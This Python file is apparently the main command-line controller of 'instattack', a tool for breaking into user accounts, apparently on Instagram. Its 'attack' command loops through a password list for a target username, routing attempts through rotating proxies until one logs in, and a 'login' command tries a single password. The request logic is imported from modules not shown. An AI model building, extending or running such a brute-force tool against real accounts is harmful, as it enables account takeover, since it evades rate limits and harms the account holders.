import asyncio
from cement import ex
from cement.utils.version import get_version_banner

from instattack.config import settings
from instattack.app.version import get_version
from instattack.app.attack.handlers import LoginHandler, ProxyHandler

from .abstract import InstattackController
from .users import UserController, UserInterface
from .proxies import ProxyController


APP_NAME = settings.APP_NAME.title()
VERSION_BANNER = f"{APP_NAME} {get_version()} {get_version_banner()}"


class AttackInterface(UserInterface):

    def _attack_handlers(self):

        start_event = asyncio.Event()
        auth_result_found = asyncio.Event()

        proxy_handler = ProxyHandler(
            self.loop,
            start_event=start_event,
            stop_event=auth_result_found,
        )

        password_handler = LoginHandler(
            self.loop,
            proxy_handler,
            start_event=start_event,
            stop_event=auth_result_found,
        )
        return proxy_handler, password_handler


class Base(InstattackController, AttackInterface):

    class Meta:
        label = 'base'

        # Text displayed at the top of --help output
        description = APP_NAME

        # Text displayed at the bottom of --help output
        epilog = 'Usage: instattack get_user username'

        interfaces = [
            AttackInterface,
        ]

        handlers = [
            UserController,
            ProxyController,
        ]

        # Controller Level Arguments. ex: 'instattack --version'
        arguments = [
            (
                ['-v', '--version'],
                {'action': 'version', 'version': VERSION_BANNER}
            ),
        ]

    def _default(self):
        """
        Default Action if No Sub-Command Passed
        """
        self.app.args.print_help()

    @ex(help="Single Login Attempt", arguments=[
        (['username'], {'help': 'Username'}),
        (['password'], {'help': 'Password'}),
    ])
    def login(self):
        """
        [x] TODO:
        --------
        Set collect flag to default to False unless specified for login and
        attack modes.
        """
        user = self.get_user(self.app.pargs.username)
        setattr(self.loop, 'user', user)

        proxy_handler, password_handler = self._attack_handlers()

        results = self.loop.run_until_complete(asyncio.gather(
            password_handler.attempt_single_login(self.app.pargs.password),
            proxy_handler.run(),
        ))

        # We might not need to stop proxy handler?
        self.loop.run_until_complete(proxy_handler.stop())
        if results[0].authenticated_result:
            self.success(results[0].authenticated_result)
        else:
            self.failure(results[0].results[0])

    @ex(help="Perform Attack Attempt", arguments=[
        (['username'], {'help': 'Username'}),
        (['-l', '--limit'], {'default': 100, 'help': 'Limit the Number of Passwords to Try'}),
        (['-nl', '--nolimit'],
            {'action': 'store_true', 'help': 'Do Not Limit the Number of Passwords to Try'})
    ])
    def attack(self):
        """
        Iteratively tries each password for the given user with the provided
        token until a successful response is achieved for each password or
        a successful authenticated response is achieved for any password.

        [x] TODO:
        --------
        Set collect flag to default to False unless specified for login and
        attack modes.

        Set limit for password limit for attack mode.
        """
        user = self.get_user(self.app.pargs.username)
        setattr(self.loop, 'user', user)

        # TODO: Add Option for Continuing Attack Regardless
        was_authenticated = self.user_authenticated(user)
        if was_authenticated:
            self.failure('User was already authenticated.')
            return

        proxy_handler, password_handler = self._attack_handlers()

        limit = None
        if not self.app.pargs.nolimit:
            limit = int(self.app.pargs.limit)

        try:
            results = self.loop.run_until_complete(asyncio.gather(
                password_handler.attack(limit=limit),
                proxy_handler.run(),
            ))
        except Exception as e:
            self.loop.run_until_complete(password_handler.finish_attack())
            self.loop.run_until_complete(proxy_handler.stop())
            raise e
        else:
            # We might not need to stop proxy handler?
            self.loop.run_until_complete(proxy_handler.stop())
            if results[0].authenticated_result:
                self.success(results[0].authenticated_result)
            else:
                self.failure('Not Authenticated')
